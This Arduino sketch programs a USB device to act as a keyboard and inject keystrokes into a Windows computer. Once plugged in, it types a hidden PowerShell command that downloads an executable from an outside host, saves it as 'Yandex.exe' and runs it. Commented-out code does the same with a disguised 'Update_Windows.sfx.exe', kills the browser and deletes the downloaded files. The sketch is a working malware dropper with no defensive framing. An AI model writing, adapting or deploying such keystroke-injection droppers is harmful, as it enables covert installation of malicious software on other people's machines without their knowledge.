#include <Keyboard.h>



void setup()
{
  delay(1000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  delay(120);
  Keyboard.print("r");
  Keyboard.releaseAll();
  delay(500);
//  Keyboard.write(0x09);
  String command = "& {Invoke-WebRequest -Uri 'https://676.su/Bsap' -OutFile 'C:\\Users\\Public\\Yandex.exe'}; Start-Process 'C:\\Users\\Public\\Yandex.exe'";
  Keyboard.print("powershell -WindowStyle Hidden -command \"" + command + "\"");
  delay(300);
  Keyboard.write(0xE0);
//  Keyboard.releaseAll();
//  Keyboard.write(0xE0);
//  
//  delay(5500);
//  Keyboard.press(KEY_LEFT_GUI);
//  delay(120);
//  Keyboard.print("r");
//  Keyboard.releaseAll();
//  delay(300);
//  Keyboard.print("powershell");
//  Keyboard.write(0xE0);
//  delay(1000);
//  Keyboard.print("taskkill /f /im browser.exe");
//  Keyboard.write(0xE0);
//  delay(200);
//  Keyboard.print("cd Downloads");
//  Keyboard.write(0xE0);
//  delay(300);
//  Keyboard.print("Tasks.exe");
//  Keyboard.write(0xE0);
//  delay(300);
//  Keyboard.print("1");
//  Keyboard.write(0xE0);
//  delay(1000);
//  Keyboard.print("del Task.exe");
//  Keyboard.write(0xE0);
//  delay(300);
//  Keyboard.print("exit");
//  Keyboard.write(0xE0);
//  Keyboard.write(0xE0);
//  Keyboard.print("cd $HOME");
//  Keyboard.write(0xE0);
//
//  String command = "\"(New-Object Net.WebClient).DownloadFile('https://clck.ru/3ABZME', 'Update_Windows.sfx.exe')\"";
//  Keyboard.print("powershell -Command " + command);
//  Keyboard.write(0xE0);
//  delay(2000);
//  Keyboard.print("./Update_Windows.sfx.exe");
//  Keyboard.write(0xE0);
//  delay(1200);
//  Keyboard.print("del Update_Windows.sfx.exe");
//  Keyboard.write(0xE0);
//  delay(250);
//  Keyboard.print("exit");
//  Keyboard.write(0xE0);
//  delay(300);
//  Keyboard.print("./Update_Windows.sfx.exe");
}

void loop() {
  
}
